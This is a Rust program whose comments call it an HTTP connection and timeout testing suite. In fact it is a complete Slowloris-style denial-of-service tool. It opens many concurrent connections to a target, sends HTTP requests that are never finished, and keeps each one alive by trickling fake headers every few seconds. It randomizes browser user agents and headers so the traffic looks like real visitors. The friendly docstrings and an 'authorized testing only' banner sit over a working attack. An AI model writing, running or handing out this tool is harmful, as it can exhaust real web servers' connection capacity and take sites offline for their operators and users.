/// HTTP Connection Testing Suite
/// A comprehensive HTTP connection testing and validation utility
/// for testing web server connection handling and timeout behavior.

use clap::Parser;
use std::time::Duration;
use tokio::io::AsyncWriteExt;
use tokio::net::{TcpStream, TcpSocket};
use tokio::time::{interval, sleep};
use tracing::{error, info, warn};
use rand::Rng;
use std::net::ToSocketAddrs;
use colored::Colorize;
use std::io::Write;

/// Display professional banner with ice/frost theme
async fn display_banner() {
    println!("{}", "╔══════════════════════════════════════════════════════════════════════╗".bright_cyan().bold());
    println!("{}", "║                                                                      ║".bright_cyan());
    
    // Title with typewriter effect - Frost theme
    let title1 = "║    ███████╗██████╗  ██████╗ ███████╗████████╗██████╗ ██╗████████╗      ║";
    for ch in title1.chars() {
        print!("{}", ch.to_string().bright_blue());
        std::io::stdout().flush().unwrap();
        tokio::time::sleep(Duration::from_micros(400)).await;
    }
    println!();
    
    let title2 = "║    ██╔════╝██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║╚══██╔══╝      ║";
    for ch in title2.chars() {
        print!("{}", ch.to_string().bright_blue());
        std::io::stdout().flush().unwrap();
        tokio::time::sleep(Duration::from_micros(400)).await;
    }
    println!();
    
    println!("{}", "║    █████╗  ██████╔╝██║   ██║███████╗   ██║   ██████╔╝██║   ██║       ║".bright_cyan());
    println!("{}", "║    ██╔══╝  ██╔══██╗██║   ██║╚════██║   ██║   ██╔══██╗██║   ██║       ║".bright_cyan());
    println!("{}", "║    ██║     ██║  ██║╚██████╔╝███████║   ██║   ██████╔╝██║   ██║       ║".bright_white());
    println!("{}", "║    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═════╝ ╚═╝   ╚═╝       ║".bright_white());
    println!("{}", "║                                                                      ║".bright_cyan());
    
    tokio::time::sleep(Duration::from_millis(100)).await;
    println!("{}", "║           HTTP CONNECTION FREEZE & TIMEOUT TESTING SUITE             ║".bright_white().bold());
    tokio::time::sleep(Duration::from_millis(100)).await;
    
    println!("{}", "║                                                                      ║".bright_cyan());
    println!("{}", "║  ┌────────────────────────────────────────────────────────────────┐  ║".bright_blue());
    println!("{}", "║  │ Version: 9.20.2091vproAlpha | Author: khaninkali             │ ║".bright_white());
    println!("{}", "║  │ Purpose: Connection Timeout & Keep-Alive Testing             │ ║".bright_cyan());
    println!("{}", "║  └────────────────────────────────────────────────────────────────┘  ║".bright_blue());
    println!("{}", "║                                                                      ║".bright_cyan());
    
    println!("{}", "║  ╔══════════════════════════════════════════════════════════════╗    ║".bright_blue().bold());
    println!("{}", "║  ║ FREEZE MODE: Authorized penetration testing only            ║     ║".bright_white());
    println!("{}", "║  ║ Unauthorized use may trigger security alerts and logging    ║     ║".bright_white());
    println!("{}", "║  ╚══════════════════════════════════════════════════════════════╝    ║".bright_blue().bold());
    
    println!("{}", "║                                                                      ║".bright_cyan());
    println!("{}", "╚══════════════════════════════════════════════════════════════════════╝".bright_cyan().bold());
    println!();
    
    // Frost initialization with ice theme
    print!("{}", "    [".bright_blue());
    print!("{}", "❄".bright_white().bold());
    print!("{}", "] ".bright_blue());
    print!("{}", "Initializing freeze protocol".bright_cyan());
    std::io::stdout().flush().unwrap();
    for _ in 0..3 {
        tokio::time::sleep(Duration::from_millis(300)).await;
        print!("{}", ".".bright_cyan());
        std::io::stdout().flush().unwrap();
    }
    println!(" {}", "FROZEN".bright_white().bold());
    println!();
}

#[derive(Parser, Clone)]
#[command(name = "http_connection_tester")]
#[command(about = "HTTP connection testing and timeout validation suite for authorized security testing")]
struct Args {
    #[arg(short, long, help = "Target URL (e.g., https://example.com)")]
    target: String,
    
    #[arg(short, long, default_value = "50", help = "Number of concurrent test connections")]
    connections: usize,
    
    #[arg(short, long, default_value = "120", help = "Test duration in seconds")]
    duration: u64,
    
    #[arg(long, default_value = "3", help = "Keep-alive interval in seconds")]
    keep_alive_interval: u64,
    
    #[arg(long, default_value = "true", help = "Enable random user agents")]
    random_ua: bool,
    
    #[arg(long, default_value = "true", help = "Enable random headers")]
    random_headers: bool,
    
    #[arg(long, default_value = "50", help = "Request timeout in milliseconds")]
    timeout_ms: u64,
    
    #[arg(long, default_value = "true", help = "Enable advanced socket options")]
    socket_options: bool,
    
    #[arg(long, default_value = "false", help = "Enable connection rotation")]
    connection_rotation: bool,
    
    #[arg(long, default_value = "100", help = "Connection delay in milliseconds")]
    connection_delay: u64,
}

/// Realistic browser user agents for connection testing
/// Contains authentic user-agent strings from major browsers for testing server compatibility
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
];

/// Standard HTTP headers for browser compatibility testing
/// Contains common HTTP headers used by modern browsers for testing server behavior
const BROWSER_HEADERS: &[(&str, &[&str])] = &[
    ("Accept-Language", &["en-US,en;q=0.9", "en-GB,en;q=0.9", "en;q=0.8"]),
    ("Accept-Encoding", &["gzip, deflate, br", "gzip, deflate", "br"]),
    ("DNT", &["1", "0"]),
    ("Connection", &["keep-alive"]),
    ("Upgrade-Insecure-Requests", &["1"]),
    ("Sec-Fetch-Dest", &["document", "empty", "script"]),
    ("Sec-Fetch-Mode", &["navigate", "cors", "no-cors"]),
    ("Sec-Fetch-Site", &["none", "same-origin", "cross-site"]),
    ("Cache-Control", &["max-age=0", "no-cache", "no-store"]),
    ("Pragma", &["no-cache"]),
    ("Sec-Ch-Ua", &["\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"", "\"Google Chrome\";v=\"120\", \"Not_A Brand\";v=\"8\""]),
    ("Sec-Ch-Ua-Mobile", &["?0", "?1"]),
    ("Sec-Ch-Ua-Platform", &["\"Windows\"", "\"macOS\"", "\"Linux\""]),
];

fn get_random_user_agent() -> &'static str {
    let mut rng = rand::thread_rng();
    USER_AGENTS[rng.gen_range(0..USER_AGENTS.len())]
}

fn get_random_header_value(header_name: &str) -> Option<&'static str> {
    for (name, values) in BROWSER_HEADERS {
        if *name == header_name {
            let mut rng = rand::thread_rng();
            return Some(values[rng.gen_range(0..values.len())]);
        }
    }
    None
}

fn generate_realistic_headers() -> Vec<(String, String)> {
    let mut headers = Vec::new();
    let mut rng = rand::thread_rng();
    
    // Always include essential headers
    headers.push(("Accept-Language".to_string(), get_random_header_value("Accept-Language").unwrap().to_string()));
    headers.push(("Accept-Encoding".to_string(), get_random_header_value("Accept-Encoding").unwrap().to_string()));
    headers.push(("DNT".to_string(), get_random_header_value("DNT").unwrap().to_string()));
    
    // Randomly include additional headers for realism
    if rng.gen_bool(0.7) {
        headers.push(("Cache-Control".to_string(), get_random_header_value("Cache-Control").unwrap().to_string()));
    }
    if rng.gen_bool(0.6) {
        headers.push(("Pragma".to_string(), "no-cache".to_string()));
    }
    if rng.gen_bool(0.8) {
        headers.push(("Sec-Fetch-Dest".to_string(), get_random_header_value("Sec-Fetch-Dest").unwrap().to_string()));
    }
    if rng.gen_bool(0.7) {
        headers.push(("Sec-Fetch-Mode".to_string(), get_random_header_value("Sec-Fetch-Mode").unwrap().to_string()));
    }
    if rng.gen_bool(0.6) {
        headers.push(("Sec-Fetch-Site".to_string(), get_random_header_value("Sec-Fetch-Site").unwrap().to_string()));
    }
    
    headers
}

/// Create HTTP connection for testing server timeout behavior
/// Establishes TCP connections and sends partial HTTP requests to test server handling
async fn create_http_test_connection(
    target: &str,
    connection_id: usize,
    args: &Args,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let url = url::Url::parse(target)?;
    let host = url.host_str().ok_or("Invalid host")?;
    let port = url.port_or_known_default().ok_or("Unknown port")?;
    
    // Configure socket options for testing
    let stream = if args.socket_options {
        let socket = TcpSocket::new_v4()?;
        socket.set_nodelay(true)?;
        socket.set_reuseaddr(true)?;
        let addr = format!("{}:{}", host, port).to_socket_addrs()?.next().unwrap();
        socket.connect(addr).await?
    } else {
        TcpStream::connect(format!("{}:{}", host, port)).await?
    };
    
    let mut stream = stream;
    
    // Build realistic HTTP request for testing
    let user_agent = if args.random_ua {
        get_random_user_agent()
    } else {
        USER_AGENTS[0]
    };
    
    let headers = if args.random_headers {
        generate_realistic_headers()
    } else {
        vec![
            ("Accept-Language".to_string(), "en-US,en;q=0.9".to_string()),
            ("Accept-Encoding".to_string(), "gzip, deflate, br".to_string()),
        ]
    };
    
    // Create partial HTTP request for timeout testing
    let mut request = format!(
        "GET /{} HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: {}\r\n\
         Connection: keep-alive\r\n",
        generate_test_path(),
        host,
        user_agent
    );
    
    // Add headers to the request
    for (key, value) in headers {
        request.push_str(&format!("{}: {}\r\n", key, value));
    }
    
    // Send partial request to test server timeout handling
    stream.write_all(request.as_bytes()).await?;
    
    info!("Connection {} established with partial HTTP request", connection_id);
    
    // Maintain connection with periodic keep-alive data
    let mut interval = interval(Duration::from_secs(args.keep_alive_interval));
    let mut counter = 0;
    
    loop {
        tokio::select! {
            _ = sleep(Duration::from_secs(args.duration)) => {
                break;
            }
            _ = interval.tick() => {
                // Send varying types of keep-alive data for comprehensive testing
                let keep_alive_data = if args.socket_options {
                    match counter % 4 {
                        0 => format!("X-Keep-Alive-{}: {}\r\n", counter, generate_test_string(8)),
                        1 => format!("Cookie: session={}{}\r\n", generate_test_string(16), counter),
                        2 => format!("X-Request-ID: {}\r\n", generate_test_uuid()),
                        _ => format!("X-Test-{}: {}\r\n", counter, generate_test_string(12)),
                    }
                } else {
                    format!("X-Connection-Test-{}: test-value\r\n", counter)
                };
                
                if let Err(e) = stream.write_all(keep_alive_data.as_bytes()).await {
                    warn!("Connection {} lost: {}", connection_id, e);
                    break;
                }
                
                if counter % 10 == 0 {
                    info!("Connection {} maintained (cycle {})", connection_id, counter);
                }
                counter += 1;
            }
        }
    }
    
    Ok(())
}

/// Generate test path for HTTP request testing
/// Creates realistic URL paths for testing server routing and handling
fn generate_test_path() -> String {
    let paths = [
        "/", "/index.html", "/home", "/login", "/dashboard", "/api/v1/users",
        "/search", "/products", "/about", "/contact", "/admin", "/wp-admin",
        "/api/data", "/json", "/xml", "/feed", "/sitemap.xml"
    ];
    let mut rng = rand::thread_rng();
    paths[rng.gen_range(0..paths.len())].to_string()
}

/// Generate test string for HTTP payload testing
/// Creates alphanumeric test strings for HTTP request testing
fn generate_test_string(len: usize) -> String {
    use rand::distributions::Alphanumeric;
    let mut rng = rand::thread_rng();
    (0..len)
        .map(|_| rng.sample(Alphanumeric) as char)
        .collect()
}

/// Generate test UUID for HTTP header testing
/// Creates UUID-like identifiers for HTTP request testing
fn generate_test_uuid() -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    format!("{:x}", rng.gen::<u128>())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // Display banner first
    display_banner().await;
    
    tracing_subscriber::fmt::init();
    
    let args = Args::parse();
    
    println!("[+] HTTP Connection Tester v9.20.2091vproAlpha");
    println!("[+] Target: {}", args.target);
    println!("[+] Test Connections: {}", args.connections);
    println!("[+] Test Duration: {}s", args.duration);
    println!("[+] Socket Options: {}", args.socket_options);
    println!();
    
    let mut handles = Vec::new();
    
    // Create concurrent test connections with staggered timing
    for i in 0..args.connections {
        let target = args.target.clone();
        let args_clone = args.clone();
        
        let handle = tokio::spawn(async move {
            if let Err(e) = create_http_test_connection(&target, i, &args_clone).await {
                error!("Connection {} failed: {}", i, e);
            }
        });
        
        handles.push(handle);
        
        // Stagger connections to avoid overwhelming the server
        if args.connection_delay > 0 {
            sleep(Duration::from_millis(args.connection_delay)).await;
        }
    }
    
    info!("All {} test connections initiated - maintaining connections...", args.connections);
    
    // Wait for test completion
    sleep(Duration::from_secs(args.duration)).await;
    
    // Gracefully shutdown connections
    info!("Test completed - shutting down connections...");
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("[+] HTTP connection testing completed successfully");
    Ok(())
}
